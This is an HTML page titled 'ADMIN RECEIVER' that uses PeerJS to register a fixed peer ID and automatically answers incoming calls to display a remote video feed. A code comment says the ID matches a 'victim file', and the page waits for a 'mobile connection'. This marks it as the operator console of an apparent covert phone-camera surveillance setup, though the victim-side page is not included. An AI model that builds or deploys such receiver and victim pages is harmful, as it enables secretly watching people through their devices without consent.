<!DOCTYPE html>
<html>
<head>
    <title>Connection Test: ADMIN</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { background: #222; color: #fff; font-family: sans-serif; text-align: center; }
        video { width: 80%; max-width: 600px; border: 5px solid #0f0; background: #000; margin-top: 20px; }
        #log { color: #ccc; font-family: monospace; margin-top: 10px; }
    </style>
</head>
<body>
    <h1>ADMIN RECEIVER</h1>
    <div id="log">Initializing...</div>
    <video id="remote-video" autoplay playsinline></video>

    <script>
        const MY_ID = 'test_admin_unique_id_999'; // Matches victim file

        const peer = new Peer(MY_ID, {
            debug: 2,
            config: {
                iceServers: [
                    { urls: 'stun:stun.l.google.com:19302' },
                    { urls: 'stun:stun1.l.google.com:19302' }
                ]
            }
        });

        peer.on('open', (id) => {
            document.getElementById('log').innerText = "Server Online. ID: " + id + "\nWaiting for mobile connection...";
        });

        peer.on('call', (call) => {
            document.getElementById('log').innerText = "INCOMING CALL RECEIVED! Answering...";
            call.answer(); // Answer the call automatically
            
            call.on('stream', (remoteStream) => {
                document.getElementById('log').innerText = "VIDEO FEED CONNECTED SUCCESS!";
                const video = document.getElementById('remote-video');
                video.srcObject = remoteStream;
            });
        });

        peer.on('error', (err) => {
            document.getElementById('log').innerText = "Error: " + err.type;
        });
    </script>
</body>
</html>
